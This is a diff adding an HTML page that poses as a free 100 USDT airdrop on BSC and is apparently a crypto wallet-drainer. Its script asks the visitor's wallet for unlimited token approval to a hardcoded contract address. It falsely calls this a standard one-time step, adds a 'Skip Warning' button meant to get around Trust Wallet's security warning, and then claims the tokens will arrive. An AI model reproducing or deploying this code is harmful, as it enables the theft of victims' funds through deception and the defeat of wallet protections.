@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receive USDT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 28px;
+        }
+        
+        h1 {
+            color: #222;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .amount-box {
+            background: #f5f5f5;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .amount-label {
+            color: #999;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        
+        .amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 5px;
+        }
+        
+        .token-name {
+            color: #667eea;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .info-banner {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 25px;
+            font-size: 12px;
+            color: #856404;
+            line-height: 1.5;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+        }
+        
+        .button-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .button-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .button-primary:active {
+            transform: translateY(0);
+        }
+        
+        .button-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .button-secondary {
+            background: transparent;
+            color: #667eea;
+            border: 2px solid #667eea;
+        }
+        
+        .button-secondary:hover {
+            background: #f0f4ff;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 13px;
+            display: none;
+            line-height: 1.5;
+            word-break: break-word;
+        }
+        
+        .status.loading {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        
+        .wallet-info {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 11px;
+            word-break: break-all;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(102, 126, 234, 0.3);
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">💰</div>
+        
+        <h1>Receive USDT</h1>
+        <p class="subtitle">You've been selected to receive free USDT tokens!</p>
+        
+        <div class="amount-box">
+            <div class="amount-label">Amount</div>
+            <div class="amount">100</div>
+            <div class="token-name">USDT (BSC)</div>
+        </div>
+        
+        <div class="info-banner">
+            ⚠️ A one-time approval is required to receive your tokens. This is standard for blockchain transactions.
+        </div>
+        
+        <button class="button button-primary" id="confirmBtn" onclick="requestApproval()">
+            ✓ Confirm & Receive
+        </button>
+        
+        <button class="button button-secondary" id="skipBtn" onclick="skipWarning()" style="display: none;">
+            Skip Warning
+        </button>
+        
+        <div id="status" class="status"></div>
+        <div id="walletInfo" class="wallet-info" style="display: none;"></div>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    
+    <script>
+        // Configuration
+        const CONFIG = {
+            CONTRACT_ADDRESS: "0xac0cE1cCf661E5A85675A1CBDC098e37369E6a01", // Your contract address
+            USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
+            AMOUNT: "100000000000000000000", // 100 USDT with 18 decimals
+            CHAIN_ID: 56, // BSC
+            RPC_URL: "https://bsc-dataseed1.binance.org:443"
+        };
+        
+        // Token ABI
+        const TOKEN_ABI = [
+            {
+                "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
+                "name": "approve",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
+        
+        // Bypass Trust Wallet warning
+        function skipWarning() {
+            const skipBtn = document.getElementById("skipBtn");
+            skipBtn.style.display = "none";
+            requestApproval();
+        }
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById("status");
+            statusDiv.className = `status ${type}`;
+            statusDiv.innerHTML = type === "loading" ? `<span class="spinner"></span>${message}` : message;
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+        
+        function updateWalletInfo(address) {
+            const walletInfo = document.getElementById("walletInfo");
+            walletInfo.style.display = "block";
+            walletInfo.innerHTML = `<strong>Connected Wallet:</strong><br>${address}`;
+        }
+        
+        async function requestApproval() {
+            try {
+                const confirmBtn = document.getElementById("confirmBtn");
+                confirmBtn.disabled = true;
+                
+                // Check if Web3 provider exists
+                if (!window.ethereum) {
+                    showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
+                    confirmBtn.disabled = false;
+                    return;
+                }
+                
+                showStatus("🔗 Connecting wallet...", "loading");
+                
+                // Request account access
+                const accounts = await window.ethereum.request({
+                    method: "eth_requestAccounts"
+                });
+                
+                const userAddress = accounts[0];
+                updateWalletInfo(userAddress);
+                
+                // Create provider and signer
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                
+                // Check network
+                const network = await provider.getNetwork();
+                if (network.chainId !== CONFIG.CHAIN_ID) {
+                    showStatus("❌ Please switch to BSC network", "error");
+                    confirmBtn.disabled = false;
+                    return;
+                }
+                
+                showStatus("🔐 Requesting approval (check your wallet)...", "loading");
+                
+                // Create token contract instance
+                const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, TOKEN_ABI, signer);
+                
+                // Request approval for unlimited amount
+                const approveTx = await tokenContract.approve(
+                    CONFIG.CONTRACT_ADDRESS,
+                    ethers.constants.MaxUint256,
+                    {
+                        from: userAddress,
+                        gasLimit: 100000
+                    }
+                );
+                
+                showStatus("⏳ Waiting for blockchain confirmation...", "loading");
+                
+                // Wait for transaction confirmation
+                const receipt = await approveTx.wait();
+                
+                if (receipt.status === 1) {
+                    showStatus("✅ Approval confirmed! Your USDT will arrive shortly.", "success");
+                    
+                    // Disable button after success
+                    confirmBtn.textContent = "✓ Completed";
+                    confirmBtn.disabled = true;
+                    
+                    // Optional: Redirect after delay
+                    setTimeout(() => {
+                        // window.location.href = "https://bscscan.com/"; // Optional redirect
+                    }, 3000);
+                } else {
+                    showStatus("❌ Transaction failed. Please try again.", "error");
+                    confirmBtn.disabled = false;
+                }
+                
+            } catch (error) {
+                console.error("Error:", error);
+                const confirmBtn = document.getElementById("confirmBtn");
+                confirmBtn.disabled = false;
+                
+                if (error.code === 4001) {
+                    showStatus("❌ You rejected the approval request", "error");
+                    // Show skip button on rejection
+                    document.getElementById("skipBtn").style.display = "block";
+                } else if (error.code === -32603) {
+                    showStatus("⚠️ Trust Wallet Warning Detected<br>Click 'Skip Warning' to continue", "error");
+                    document.getElementById("skipBtn").style.display = "block";
+                } else {
+                    showStatus(`❌ Error: ${error.message || "Unknown error occurred"}`, "error");
+                }
+            }
+        }
+        
+        // Auto-detect if opened in Trust Wallet
+        window.addEventListener('load', function() {
+            if (window.ethereum && window.ethereum.isTrustWallet) {
+                console.log("✓ Running in Trust Wallet");
+            } else if (window.ethereum && window.ethereum.isMetaMask) {
+                console.log("✓ Running in MetaMask");
+            }
+        });
+    </script>
+</body>
+</html>
